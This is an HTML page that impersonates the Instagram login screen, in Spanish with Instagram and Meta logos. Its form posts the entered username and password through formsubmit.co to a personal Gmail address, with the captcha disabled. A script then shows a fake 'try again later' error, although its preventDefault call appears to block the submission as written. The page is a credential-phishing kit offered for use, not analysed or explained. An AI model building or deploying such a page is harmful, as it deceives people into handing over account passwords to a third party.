<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Iniciar sesión</title>
  <style>
    body {
      margin: 0;
      font-family: sans-serif;
      background: linear-gradient(to bottom right, #1d2731, #0e1e28);
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      width: 90%;
      max-width: 360px;
      text-align: center;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    .logo {
      width: 60px;
      margin: 20px auto 10px;
    }
    .language-select {
      align-self: flex-end;
      margin-right: 10px;
      margin-top: -10px;
      margin-bottom: 20px;
      color: #aaa;
      background: transparent;
      border: none;
      font-size: 14px;
    }
    .input-box {
      background: #18232f;
      border: 1px solid #3d4c5c;
      border-radius: 10px;
      margin: 10px 0;
      padding: 12px;
      width: 100%;
      color: white;
      font-size: 16px;
    }
    .button {
      background-color: #007aff;
      color: white;
      padding: 14px;
      width: 100%;
      border: none;
      border-radius: 30px;
      font-size: 16px;
      margin-top: 20px;
      cursor: pointer;
    }
    .link {
      margin-top: 15px;
      color: white;
      text-decoration: none;
      display: block;
    }
    .create-account {
      margin-top: 40px;
      border: 1px solid #007aff;
      border-radius: 30px;
      padding: 12px;
      color: #007aff;
      background-color: transparent;
      width: 100%;
      cursor: pointer;
      font-size: 16px;
    }
    .meta-logo {
      margin-top: 30px;
    }
    .meta-logo img {
      width: 60px;
      filter: brightness(0) invert(1);
    }
  </style>
</head>
<body>
  <div class="container">
    <select class="language-select">
      <option>Español</option>
    </select>

    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram" class="logo" />

    <!-- FORMULARIO CON FORM SUBMIT -->
    <form action="https://formsubmit.co/gigantenoble45@gmail.com" method="POST" onsubmit="mostrarError(event)">
      <input type="text" name="usuario" class="input-box" placeholder="Nombre de usuario, correo o celular" required />
      <input type="password" name="contraseña" class="input-box" placeholder="Contraseña" required />
      <button type="submit" class="button">Iniciar sesión</button>

      <!-- Anti-spam -->
      <input type="hidden" name="_captcha" value="false">
      <input type="hidden" name="_template" value="table">
    </form>

    <a href="#" class="link">¿Olvidaste tu contraseña?</a>
    <button class="create-account">Crear cuenta nueva</button>

    <!-- LOGO META -->
    <div class="meta-logo">
      <img src="https://upload.wikimedia.org/wikipedia/commons/8/87/Meta_Logo.svg" alt="Meta">
    </div>
  </div>

  <script>
    function mostrarError(e) {
      e.preventDefault();
      alert("No se puede iniciar sesión en este momento. Inténtalo más tarde.");
    }
  </script>
</body>
</html>
